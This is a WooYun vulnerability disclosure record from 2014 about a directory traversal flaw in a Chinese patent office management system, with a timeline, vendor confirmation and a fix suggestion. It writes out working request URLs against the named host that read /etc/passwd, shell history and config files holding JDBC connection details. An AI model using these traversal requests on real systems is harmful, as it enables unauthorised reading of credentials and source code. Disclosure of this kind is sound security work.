{"id": 52213, "wybug_id": "wooyun-2014-071956", "wybug_title": "国家知识产权局某管理系统任意文件遍历漏洞", "wybug_corp": "dlgl.sipo.gov.cn", "wybug_author": "Liuz5O69", "wybug_date": "2014-08-11 16:52", "wybug_open_date": "2014-09-25 16:54", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取", "文件操作参数未加过滤", "目录遍历", "敏感信息泄漏", "任意文件遍历下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向公众公开  简要描述： 国家知识产权局某专利系统存在目录遍历漏洞，可读取服务器任意文件，包括下载代码包。 详细说明：  提交http://dlgl.sipo.gov.cn/freeze.main?filePath=../../../../../../../../../../etc/passwd&txn-code=ImgOutServlet&type=agent，可读取相关文件信息：\n\n   漏洞证明：  1.读取操作系统类型，中标麒麟linux5.4\n\n2.读取apache配置文件\n\n3.通过passwd文件知道服务器用的weblogic,提交\nhttp://dlgl.sipo.gov.cn/freeze.main?filePath=../../../../../../../../../../app/bea/.bash_history&txn-code=ImgOutServlet&type=agent\n,查询其输入过得命令：\n\n4.通过历史命令记录查询得知服务器中间件目录为 /app/bea/TongWeb_scd5.0/，web应用目录为/app/bea/DLGL/ROOT20130816/ ，提交\nhttp://dlgl.sipo.gov.cn/freeze.main?filePath=../../../../../../../../../../app/bea/DLGL/ROOT20130816/WEB-INF/classes/config/dependance.xml&txn-code=ImgOutServlet&type=agent\n，可查看开发包列表，修改请求目录为/app/bea/DLGL/ROOT20130816/WEB-INF/lib/xx.jar，可下载jar包：\n\n反编译可查看源码：\n\n5.JDBC连接信息，提交\nhttp://dlgl.sipo.gov.cn/freeze.main?filePath=../../../../../../../../../../app/bea/TongWeb_scd5.0/config/twns.xml&txn-code=ImgOutServlet&type=agent\n\n\n   修复方案：  过滤filePath的输入。   版权声明：转载请注明来源 Liuz5O69@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-08-16 10:12 厂商回复：   最新状态： 2014-08-20：补充处置情况：CNVD确认并复现所述情况，已经转由CNCERT尝试向网站管理单位通报，后续上报国家上级信息安全协调机构。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}